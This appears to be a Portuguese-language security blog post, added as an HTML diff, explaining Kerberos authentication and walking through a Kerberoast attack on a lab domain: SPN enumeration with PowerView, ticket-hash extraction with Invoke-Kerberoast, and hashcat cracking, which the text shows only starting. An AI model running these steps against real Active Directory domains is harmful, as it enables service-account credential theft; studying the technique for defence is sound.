@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Kerberos & Kerberoast Attack – tuxtrack – Hacking stuff directly from sertão.</title>
+
+        <meta charset="utf-8" />
+    <meta content='text/html; charset=utf-8' http-equiv='Content-Type'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0'>
+
+    
+    <meta name="description" content="Baseado na RFC 1510, o  Kerberos fornece autenticação para o ambiente de computação distribuído e padronização para interoperar com diversos sistemas operacionais. Em ambientes Microsoft Windows, o protocolo é instalado como parte do Active Directory Services, oferecendo o controle centralizado de gerenciamento de contas de usuários, serviços, computadores e recursos.
+" />
+    <meta property="og:description" content="Baseado na RFC 1510, o  Kerberos fornece autenticação para o ambiente de computação distribuído e padronização para interoperar com diversos sistemas operacionais. Em ambientes Microsoft Windows, o protocolo é instalado como parte do Active Directory Services, oferecendo o controle centralizado de gerenciamento de contas de usuários, serviços, computadores e recursos.
+" />
+    
+    <meta name="author" content="tuxtrack" />
+
+    
+    <meta property="og:title" content="Kerberos & Kerberoast Attack" />
+    <meta property="twitter:title" content="Kerberos & Kerberoast Attack" />
+    
+
+    <!--[if lt IE 9]>
+      <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+    <link rel="stylesheet" type="text/css" href="/style.css" />
+    <link rel="alternate" type="application/rss+xml" title="tuxtrack - Hacking stuff directly from sertão." href="/feed.xml" />
+
+    <!-- Created with Jekyll Now - http://github.com/barryclark/jekyll-now -->
+  </head>
+
+  <body>
+    <div class="wrapper-masthead">
+      <div class="container">
+        <header class="masthead clearfix">
+          <a href="/" class="site-avatar"><img src="https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/images/lamp.png" /></a>
+
+          <div class="site-info">
+            <h1 class="site-name"><a href="/">tuxtrack</a></h1>
+            <p class="site-description">Hacking stuff directly from sertão.</p>
+          </div>
+
+          <nav>
+            <a href="/">Blog</a>
+            <a href="/zdr">ZDR</a>
+            <a href="/about">About</a>
+          </nav>
+        </header>
+      </div>
+    </div>
+
+    <div id="main" role="main" class="container">
+      <article class="post">
+  <h1>Kerberos & Kerberoast Attack</h1>
+
+  <div class="entry">
+    <p>Baseado na RFC 1510, o  Kerberos fornece autenticação para o ambiente de computação distribuído e padronização para interoperar com diversos sistemas operacionais. Em ambientes Microsoft Windows, o protocolo é instalado como parte do Active Directory Services, oferecendo o controle centralizado de gerenciamento de contas de usuários, serviços, computadores e recursos.</p>
+
+<blockquote>
+  <p>Kerberos é um protocolo de autenticação usado para verificar a identidade de um usuário ou host. <a href="https://docs.microsoft.com/pt-br/windows-server/security/kerberos/kerberos-authentication-overview">Microsoft Docs</a></p>
+</blockquote>
+
+<h3 id="funcionamento-do-processo-de-autenticação">Funcionamento do processo de autenticação</h3>
+
+<ul>
+  <li>No momento em que o usuário faz logon utilizando credenciais de um domínio, o Local Security Authority Subsystem Service (LSASS) armazena o hash da senha. O LSASS armazena credenciais na memória em nome de usuários com sessões ativas do Windows.</li>
+</ul>
+
+<p><img src="http://127.0.0.1:4000/images/kb101/01.png" alt="" /></p>
+
+<hr />
+
+<ul>
+  <li>O TGT (Ticket-Granting-Ticket) será requisitado ao KDC (Key Distribution Center) service presente no DC (Domain Controller), utilizando algum dos algoritimos de criptografia (RC4_HMAC, DES_CBC_MD5, 128AES_HMAC, 256AES_HMAC…) baseando-se no <a href="https://docs.microsoft.com/pt-br/windows-server/identity/ad-ds/active-directory-functional-levels">Domain Level Function</a>.</li>
+</ul>
+
+<p><img src="http://127.0.0.1:4000/images/kb101/02.png" alt="" /></p>
+
+<hr />
+
+<ul>
+  <li>Ocorrendo a validação da autenticação da conta, o Domain Controller retorna o TGT assinado com o hash da conta de serviço krbtgt (Key Distribution Center Service Account). krbtgt é a conta utilizada para criptografar e assinar todos os tickets do domínio, logo, se o hash da conta é comprometido, um atacante pode forjar tickets (Golden Tickets).</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\tux_wmi_recon.ps1</span><span class="w">
+</span><span class="nf">PS</span><span class="w"> </span><span class="nx">C:\Users\Administrator\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Tux-GetUser</span><span class="w"> </span><span class="nx">krbtgt</span><span class="w">
+</span><span class="nf">User</span><span class="w"> </span><span class="nx">Information</span><span class="w"> </span><span class="nx">from:</span><span class="w"> </span><span class="nx">krbtgt</span><span class="w">
+
+</span><span class="nf">DS_Name</span><span class="w">                 </span><span class="p">:</span><span class="w"> </span><span class="nx">krbtgt</span><span class="w">
+</span><span class="nf">ADSIPath</span><span class="w">                </span><span class="p">:</span><span class="w"> </span><span class="nx">LDAP://CN</span><span class="o">=</span><span class="nf">krbtgt</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="nf">Users</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nf">hnr</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nf">local</span><span class="w">
+</span><span class="nf">DS_description</span><span class="w">          </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nf">Key</span><span class="w"> </span><span class="nx">Distribution</span><span class="w"> </span><span class="nx">Center</span><span class="w"> </span><span class="nx">Service</span><span class="w"> </span><span class="nx">Account</span><span class="p">}</span><span class="w">
+</span><span class="nf">DS_servicePrincipalName</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nf">kadmin/changepw</span><span class="p">}</span><span class="w">
+</span><span class="nf">DS_memberOf</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nf">CN</span><span class="o">=</span><span class="nf">Denied</span><span class="w"> </span><span class="nx">RODC</span><span class="w"> </span><span class="nx">Password</span><span class="w"> </span><span class="nx">Replication</span><span class="w"> </span><span class="nx">Group</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="nf">Users</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nf">hnr</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nf">local</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p><img src="http://127.0.0.1:4000/images/kb101/03.png" alt="" /></p>
+
+<hr />
+
+<ul>
+  <li>Para que o usuário possa utilizar algum serviço do domínio, o processo de autorização se dá através do envio do TGT ao Domain Controller para a requisição do Service Ticket ou TGS (Ticket-Grating-Service), ex.: MSSqlSvc/SQL.domain.com.</li>
+</ul>
+
+<p><img src="http://127.0.0.1:4000/images/kb101/04.png" alt="" /></p>
+
+<hr />
+
+<ul>
+  <li>O Domain Controller retorna o Service Ticket (TGS) correspondente ao serviço solicitado, após identificar qual conta de usuário/computador possui o serviço solicitado. O ticket retornado é criptografado com o hash da conta de usuário/computador correspondente ao serviço.</li>
+</ul>
+
+<p><img src="http://127.0.0.1:4000/images/kb101/05.png" alt="" /></p>
+
+<hr />
+
+<ul>
+  <li>O Service Ticket (TGS) é apresentado ao server que armazena o serviço solicitado, o servidor descriptografa o hash utilizando seu próprio hash (Hash esse que foi utilizado pelo DC para criptografar o TGS no passo anterior) e o serviço é acessado.</li>
+</ul>
+
+<p><img src="http://127.0.0.1:4000/images/kb101/06.png" alt="" /></p>
+
+<hr />
+
+<h3 id="kerberoast">Kerberoast</h3>
+
+<p>Kerberoast é o nome de um ataque ao processo de assinatura de um Service Ticket. TGS’s tickets são criptografados com hash NTLM da conta de domínio utilizada como conta de serviço que utilize o kerberos para autenticação, no caso abaixo, a conta sqlserver para o SPN MSSQLSvc/SQL.hnr.local (TGS-REP). O acesso ao serviço não é necessário para se ter acesso ao ticket de serviço, já que como mostrado anteriormente, para requisitar um TGS, o atacante necessita apenas do TGT (TGS-REQ).</p>
+
+<blockquote>
+  <p>SPN - A service principal name (SPN) is a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account. This allows a client application to request that the service authenticate an account even if the client does not have the account name. <a href="https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names">MSDN</a></p>
+</blockquote>
+
+<p>Listagem de SPN’s do domínio utilizando o módulo Get-NetUser do <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a>, ou poderíamos utilizar a própria ferramenta do Windows,  <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v%3Dws.11)">setspn.exe</a>.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">PS</span><span class="w"> </span><span class="nx">C:\Users\charris\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-NetUser</span><span class="w"> </span><span class="nt">-SPN</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="nx">hnr.local</span><span class="w">                                                                                                                                      
+
+</span><span class="nf">logoncount</span><span class="w">                    </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">
+</span><span class="nf">badpasswordtime</span><span class="w">               </span><span class="p">:</span><span class="w"> </span><span class="nx">12/31/1600</span><span class="w"> </span><span class="nx">10:00:00</span><span class="w"> </span><span class="nx">PM</span><span class="w">
+</span><span class="nf">description</span><span class="w">                   </span><span class="p">:</span><span class="w"> </span><span class="nx">Key</span><span class="w"> </span><span class="nx">Distribution</span><span class="w"> </span><span class="nx">Center</span><span class="w"> </span><span class="nx">Service</span><span class="w"> </span><span class="nx">Account</span><span class="w">
+</span><span class="nf">distinguishedname</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="nf">krbtgt</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="nf">Users</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nf">hnr</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nf">local</span><span class="w">
+</span><span class="nf">objectclass</span><span class="w">                   </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nf">top</span><span class="p">,</span><span class="w"> </span><span class="nx">person</span><span class="p">,</span><span class="w"> </span><span class="nx">organizationalPerson</span><span class="p">,</span><span class="w"> </span><span class="nx">user</span><span class="p">}</span><span class="w">
+</span><span class="nf">name</span><span class="w">                          </span><span class="p">:</span><span class="w"> </span><span class="nx">krbtgt</span><span class="w">
+</span><span class="nf">primarygroupid</span><span class="w">                </span><span class="p">:</span><span class="w"> </span><span class="nx">513</span><span class="w">
+</span><span class="nf">objectsid</span><span class="w">                     </span><span class="p">:</span><span class="w"> </span><span class="nx">S-1-5-21-45967290-1955130809-1078885739-502</span><span class="w">
+</span><span class="nf">whenchanged</span><span class="w">                   </span><span class="p">:</span><span class="w"> </span><span class="nx">2/11/2020</span><span class="w"> </span><span class="nx">3:41:33</span><span class="w"> </span><span class="nx">AM</span><span class="w">
+</span><span class="nf">logonhours</span><span class="w">                    </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="mi">255</span><span class="p">,</span><span class="w"> </span><span class="mi">255</span><span class="p">,</span><span class="w"> </span><span class="mi">255</span><span class="p">,</span><span class="w"> </span><span class="mi">255</span><span class="o">...</span><span class="p">}</span><span class="w">
+</span><span class="nf">admincount</span><span class="w">                    </span><span class="p">:</span><span class="w"> </span><span class="nx">1</span><span class="w">
+</span><span class="nf">codepage</span><span class="w">                      </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">
+</span><span class="nf">samaccounttype</span><span class="w">                </span><span class="p">:</span><span class="w"> </span><span class="nx">805306368</span><span class="w">
+</span><span class="nf">showinadvancedviewonly</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">True</span><span class="w">
+</span><span class="nf">accountexpires</span><span class="w">                </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">
+</span><span class="nf">cn</span><span class="w">                            </span><span class="p">:</span><span class="w"> </span><span class="nx">krbtgt</span><span class="w">
+</span><span class="nf">adspath</span><span class="w">                       </span><span class="p">:</span><span class="w"> </span><span class="nx">LDAP://GOKU.hnr.local/CN</span><span class="o">=</span><span class="nf">krbtgt</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="nf">Users</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nf">hnr</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nf">local</span><span class="w">
+</span><span class="nf">instancetype</span><span class="w">                  </span><span class="p">:</span><span class="w"> </span><span class="nx">4</span><span class="w">
+</span><span class="nf">objectguid</span><span class="w">                    </span><span class="p">:</span><span class="w"> </span><span class="nx">33883e3e-0893-47f3-bff4-df5ebbd1a7eb</span><span class="w">
+</span><span class="nf">lastlogon</span><span class="w">                     </span><span class="p">:</span><span class="w"> </span><span class="nx">12/31/1600</span><span class="w"> </span><span class="nx">10:00:00</span><span class="w"> </span><span class="nx">PM</span><span class="w">
+</span><span class="nf">lastlogoff</span><span class="w">                    </span><span class="p">:</span><span class="w"> </span><span class="nx">12/31/1600</span><span class="w"> </span><span class="nx">10:00:00</span><span class="w"> </span><span class="nx">PM</span><span class="w">
+</span><span class="nf">samaccountname</span><span class="w">                </span><span class="p">:</span><span class="w"> </span><span class="nx">krbtgt</span><span class="w">
+</span><span class="nf">objectcategory</span><span class="w">                </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="nf">Person</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="nf">Schema</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="kr">Configuration</span><span class="p">,</span><span class="nf">DC</span><span class="o">=</span><span class="nf">hnr</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nf">local</span><span class="w">
+</span><span class="nf">dscorepropagationdata</span><span class="w">         </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="mi">2</span><span class="nf">/10/2020</span><span class="w"> </span><span class="nx">10:56:16</span><span class="w"> </span><span class="nx">AM</span><span class="p">,</span><span class="w"> </span><span class="nx">2/10/2020</span><span class="w"> </span><span class="nx">10:29:34</span><span class="w"> </span><span class="nx">AM</span><span class="p">,</span><span class="w"> </span><span class="nx">1/1/1601</span><span class="w"> </span><span class="nx">12:04:16</span><span class="w"> </span><span class="nx">AM</span><span class="p">}</span><span class="w">
+</span><span class="nf">serviceprincipalname</span><span class="w">          </span><span class="p">:</span><span class="w"> </span><span class="nx">kadmin/changepw</span><span class="w">
+</span><span class="nf">memberof</span><span class="w">                      </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="nf">Denied</span><span class="w"> </span><span class="nx">RODC</span><span class="w"> </span><span class="nx">Password</span><span class="w"> </span><span class="nx">Replication</span><span class="w"> </span><span class="nx">Group</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="nf">Users</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nf">hnr</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nf">local</span><span class="w">
+</span><span class="nf">whencreated</span><span class="w">                   </span><span class="p">:</span><span class="w"> </span><span class="nx">2/10/2020</span><span class="w"> </span><span class="nx">10:29:34</span><span class="w"> </span><span class="nx">AM</span><span class="w">
+</span><span class="nf">iscriticalsystemobject</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">True</span><span class="w">
+</span><span class="nf">badpwdcount</span><span class="w">                   </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">
+</span><span class="nf">useraccountcontrol</span><span class="w">            </span><span class="p">:</span><span class="w"> </span><span class="nx">514</span><span class="w">
+</span><span class="nf">usncreated</span><span class="w">                    </span><span class="p">:</span><span class="w"> </span><span class="nx">12324</span><span class="w">
+</span><span class="nf">countrycode</span><span class="w">                   </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">
+</span><span class="nf">pwdlastset</span><span class="w">                    </span><span class="p">:</span><span class="w"> </span><span class="nx">2/11/2020</span><span class="w"> </span><span class="nx">12:41:33</span><span class="w"> </span><span class="nx">AM</span><span class="w">
+</span><span class="nf">msds-supportedencryptiontypes</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">
+</span><span class="nf">usnchanged</span><span class="w">                    </span><span class="p">:</span><span class="w"> </span><span class="nx">20571</span><span class="w">
+
+</span><span class="nf">logoncount</span><span class="w">               </span><span class="p">:</span><span class="w"> </span><span class="nx">20</span><span class="w">
+</span><span class="nf">badpasswordtime</span><span class="w">          </span><span class="p">:</span><span class="w"> </span><span class="nx">2/12/2020</span><span class="w"> </span><span class="nx">3:51:51</span><span class="w"> </span><span class="nx">PM</span><span class="w">
+</span><span class="nf">distinguishedname</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="nf">SQLServer</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="nf">Managed</span><span class="w"> </span><span class="nx">Service</span><span class="w"> </span><span class="nx">Accounts</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nf">hnr</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nf">local</span><span class="w">
+</span><span class="nf">objectclass</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nf">top</span><span class="p">,</span><span class="w"> </span><span class="nx">person</span><span class="p">,</span><span class="w"> </span><span class="nx">organizationalPerson</span><span class="p">,</span><span class="w"> </span><span class="nx">user</span><span class="p">}</span><span class="w">
+</span><span class="nf">displayname</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="nx">SQLServer</span><span class="w">
+</span><span class="nf">lastlogontimestamp</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="nx">2/12/2020</span><span class="w"> </span><span class="nx">3:52:01</span><span class="w"> </span><span class="nx">PM</span><span class="w">
+</span><span class="nf">userprincipalname</span><span class="w">        </span><span class="p">:</span><span class="w"> </span><span class="nx">sqlserver</span><span class="err">@</span><span class="nx">hnr.local</span><span class="w">
+</span><span class="nf">name</span><span class="w">                     </span><span class="p">:</span><span class="w"> </span><span class="nx">SQLServer</span><span class="w">
+</span><span class="nf">objectsid</span><span class="w">                </span><span class="p">:</span><span class="w"> </span><span class="nx">S-1-5-21-45967290-1955130809-1078885739-1602</span><span class="w">
+</span><span class="nf">samaccountname</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">sqlserver</span><span class="w">
+</span><span class="nf">codepage</span><span class="w">                 </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">
+</span><span class="nf">samaccounttype</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">805306368</span><span class="w">
+</span><span class="nf">whenchanged</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="nx">2/12/2020</span><span class="w"> </span><span class="nx">11:10:04</span><span class="w"> </span><span class="nx">PM</span><span class="w">
+</span><span class="nf">accountexpires</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">9223372036854775807</span><span class="w">
+</span><span class="nf">countrycode</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">
+</span><span class="nf">adspath</span><span class="w">                  </span><span class="p">:</span><span class="w"> </span><span class="nx">LDAP://GOKU.hnr.local/CN</span><span class="o">=</span><span class="nf">SQLServer</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="nf">Managed</span><span class="w"> </span><span class="nx">Service</span><span class="w"> </span><span class="nx">Accounts</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nf">hnr</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nf">local</span><span class="w">
+</span><span class="nf">instancetype</span><span class="w">             </span><span class="p">:</span><span class="w"> </span><span class="nx">4</span><span class="w">
+</span><span class="nf">usncreated</span><span class="w">               </span><span class="p">:</span><span class="w"> </span><span class="nx">28785</span><span class="w">
+</span><span class="nf">objectguid</span><span class="w">               </span><span class="p">:</span><span class="w"> </span><span class="nx">30de1078-1fed-40af-81cc-e79f0b7537f0</span><span class="w">
+</span><span class="nf">lastlogoff</span><span class="w">               </span><span class="p">:</span><span class="w"> </span><span class="nx">12/31/1600</span><span class="w"> </span><span class="nx">10:00:00</span><span class="w"> </span><span class="nx">PM</span><span class="w">
+</span><span class="nf">msds-allowedtodelegateto</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">MSSQLSvc/SQL.hnr.local</span><span class="w">
+</span><span class="nf">objectcategory</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="nf">Person</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="nf">Schema</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="kr">Configuration</span><span class="p">,</span><span class="nf">DC</span><span class="o">=</span><span class="nf">hnr</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nf">local</span><span class="w">
+</span><span class="nf">dscorepropagationdata</span><span class="w">    </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="mi">2</span><span class="nf">/12/2020</span><span class="w"> </span><span class="nx">6:06:13</span><span class="w"> </span><span class="nx">PM</span><span class="p">,</span><span class="w"> </span><span class="nx">1/1/1601</span><span class="w"> </span><span class="nx">12:00:00</span><span class="w"> </span><span class="nx">AM</span><span class="p">}</span><span class="w">
+</span><span class="nf">serviceprincipalname</span><span class="w">     </span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nf">MSSQLSvc/SQL.hnr.local:1433</span><span class="p">,</span><span class="w"> </span><span class="nx">MSSQLSvc/SQL.hnr.local:SQLEXPRESS</span><span class="p">,</span><span class="w"> </span><span class="nx">MSSQLSvc/:1433</span><span class="p">,</span><span class="w"> </span><span class="nx">MSSQLSvc/SQL.hnr.local</span><span class="p">}</span><span class="w">
+</span><span class="nf">givenname</span><span class="w">                </span><span class="p">:</span><span class="w"> </span><span class="nx">SQLServer</span><span class="w">
+</span><span class="nf">lastlogon</span><span class="w">                </span><span class="p">:</span><span class="w"> </span><span class="nx">2/12/2020</span><span class="w"> </span><span class="nx">6:13:45</span><span class="w"> </span><span class="nx">PM</span><span class="w">
+</span><span class="nf">badpwdcount</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="nx">0</span><span class="w">
+</span><span class="nf">cn</span><span class="w">                       </span><span class="p">:</span><span class="w"> </span><span class="nx">SQLServer</span><span class="w">
+</span><span class="nf">useraccountcontrol</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="nx">512</span><span class="w">
+</span><span class="nf">whencreated</span><span class="w">              </span><span class="p">:</span><span class="w"> </span><span class="nx">2/12/2020</span><span class="w"> </span><span class="nx">6:06:13</span><span class="w"> </span><span class="nx">PM</span><span class="w">
+</span><span class="nf">primarygroupid</span><span class="w">           </span><span class="p">:</span><span class="w"> </span><span class="nx">513</span><span class="w">
+</span><span class="nf">pwdlastset</span><span class="w">               </span><span class="p">:</span><span class="w"> </span><span class="nx">2/12/2020</span><span class="w"> </span><span class="nx">8:10:04</span><span class="w"> </span><span class="nx">PM</span><span class="w">
+</span><span class="nf">usnchanged</span><span class="w">               </span><span class="p">:</span><span class="w"> </span><span class="nx">32844</span><span class="w">
+</span></code></pre></div></div>
+<p>Extração do ticket criptografado do TGS-REP, utilizando o módulo <a href="https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/">Invoke-Kerberoast</a>:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">PS</span><span class="w"> </span><span class="nx">C:\Users\charris\Desktop</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Invoke-Kerberoast</span><span class="w"> </span><span class="nt">-domain</span><span class="w"> </span><span class="nx">hnr.local</span><span class="w"> </span><span class="nt">-OutputFormat</span><span class="w"> </span><span class="nx">Hashcat</span><span class="w">                                                                                                               
+
+</span><span class="nf">TicketByteHexStream</span><span class="w">  </span><span class="p">:</span><span class="w">
+</span><span class="nf">Hash</span><span class="w">                 </span><span class="p">:</span><span class="w"> </span><span class="nv">$krb5tgs$23</span><span class="err">$</span><span class="o">*</span><span class="nx">sqlserver</span><span class="nv">$hnr</span><span class="o">.</span><span class="nf">local</span><span class="nv">$MSSQLSvc</span><span class="nx">/SQL.hnr.local:1433</span><span class="o">*</span><span class="nv">$6EB0AF7AF18FE1BD3B1033840C3848CB$58E8E31B0086B724DA67DFA11BC6C2A6B36399DFD60A6DD935CD850BE8C9365821A04A6F4F113B</span><span class="w">
+                       </span><span class="nx">6CC178A80467DCB6AFE6DA14F2A8286BD91A079A795B77084DBDD876323FE5A9130E215E3F8D2E763D9F21840091336DCB315082C29BDC6A3E34A94DB26A8DDA2E007DF3DE085A1030FDAC24AF832C100FC7BBB6D00EE</span><span class="w">
+                       </span><span class="nf">CC8A375C7408EA858BBF746A0754BF58DE9D39646636F6B228D97DEBED70960CCBC1B6A6EC01936C9744CC6D43E38518AA24A84E3353E9AA3DB31E6FFA8D15917F10BF97E1909D70276F9B0C33ACB1B05DE912DDF9BE6</span><span class="w">
+                       </span><span class="nf">DA50BD35CE3A295AF29B8D530F2EAEDDAEFDC34A8BC0C05C3C592B4D1A5F296C20B9A37B7B08F4D19955C08A53BC80C8DDEE168D26E726FAD832355DF45583B78D70C8EE676B6838D155A864763667FFF2048D2BD4D35</span><span class="w">
+                       </span><span class="nf">F34EF06BD7E387EDC08402D8703CE635710B1A33E352225A680FE15F2F1F6D3B26D91B1C7616F1B558759EF82B4350E846D7245CAD30D65C1CDB39E2DBC34C8E1F9ECC4744BF75302EBADEA2BF8B40BB234307916CAC4</span><span class="w">
+                       </span><span class="mi">78</span><span class="nf">A89A42062908F41FA1241B1489AE45731E2AEE521C5B56805C2C2152E117C42AC1BAE2159806F8F42D9463D7B2ED710F5BA85FC60D0988DCA6C70551DC95F2E2248B2F1E287CD156FB9B13356E9EE797D9FF17E0231</span><span class="w">
+                       </span><span class="nf">BE8406669AD7EEC934CB17F863BFB7DC545E0106BFE09DF621F9922C514D9242E07F2395F3286D78ADE0AAC6EC18D8CB3414018B9D82ECB39B1258805D0953AA564179BD60F2E8361671081304AEB06BB5D53F48F87BE</span><span class="w">
+                       </span><span class="mi">416</span><span class="nf">FB203F14F835C841919E542D0C381D06EC1ACA47EDB88950EDFE7D6BAC6EA91FD806F21431A4B19179D34FCEF03D4774EFEA272FEDDC6D6BCBAD9E8E366DF8ECF9DB571857978DEF90727E92E49AA1795A5EFE7C7B</span><span class="w">
+                       </span><span class="nf">A57BD02FA28AD95DD9639EC5BDE3F3C229AC94AE20F574186334132084A94BBB0AC963E070AB9D5BF33D57EDAF43B653736FECA62B4C5414C5E68357527C0AB1E3C1F8B9306601DC3DA93D573C880642965F9AC587CB5</span><span class="w">
+                       </span><span class="mi">052</span><span class="nf">ABF1E667D418CC3AB0B7D236D8B33A45FB328C094603C4388BCE467DD2EEA580130564541C31AE3CA1DE10F244DC05F4FA8F405A5C1B6D1C5C79A885C2BCD1A505989B70F005884BD639170E3C1147823ECC9EFFB0</span><span class="w">
+                       </span><span class="nf">A03C2B718595719DB8AD60A74AE06A92CB917B05E43E09D3993A5BACA5F656072294B9ECC64BC028C685358455935F7FC96E76A81E4771CA0BDDCB23346708B0B4EFE6929050846B6404D784A989F5A29EEA422E34225</span><span class="w">
+                       </span><span class="mi">44</span><span class="nf">DDC77FB1B191249E2D7D19405F094A2934F5C1BF7DDCA532236C77EA98E76BB47F8391F39DECC3E64BF9667B8D28491CF09EBC28A0AF17E33C88E02BAD1346396BE2E2D75A079218ED683A2EB466B34EF5C274FE3A8</span><span class="w">
+                       </span><span class="mi">62</span><span class="nf">BD89A260088C356201934C783D4166827F30DA0DAF4D2162DB215362BD299CFBE5B3D1855C1E70CFDEA5C5024FC4B6090B9037194F38EF884DCE5FE8DA037638EF2F11B93C8382D282BD0D761F697795D7AD38D9B75</span><span class="w">
+                       </span><span class="mi">198</span><span class="nf">AF91F92E0D2A11595F3E6D63113165A8849DD8150284312D3AFB6047F88F5C88F76E1</span><span class="w">
+</span><span class="nf">SamAccountName</span><span class="w">       </span><span class="p">:</span><span class="w"> </span><span class="nx">sqlserver</span><span class="w">
+</span><span class="nf">DistinguishedName</span><span class="w">    </span><span class="p">:</span><span class="w"> </span><span class="nx">CN</span><span class="o">=</span><span class="nf">SQLServer</span><span class="p">,</span><span class="nx">CN</span><span class="o">=</span><span class="nf">Managed</span><span class="w"> </span><span class="nx">Service</span><span class="w"> </span><span class="nx">Accounts</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nf">hnr</span><span class="p">,</span><span class="nx">DC</span><span class="o">=</span><span class="nf">local</span><span class="w">
+</span><span class="nf">ServicePrincipalName</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">MSSQLSvc/SQL.hnr.local:1433</span><span class="w">
+</span></code></pre></div></div>
+<p>Processo de tentativa de descoberta da credencial com <a href="https://hashcat.net/hashcat/">HashCat</a>.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat-5.1.0 ./hashcat64.bin -a 0 -m 13100 hash.txt ~/tools/wordlist/br-wordlist.txt
+hashcat (v5.1.0) starting...
+
+OpenCL Platform #1: NVIDIA Corporation
+======================================
+* Device #1: GeForce GPU, 500/2000 MB allocatable, 5MCU
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
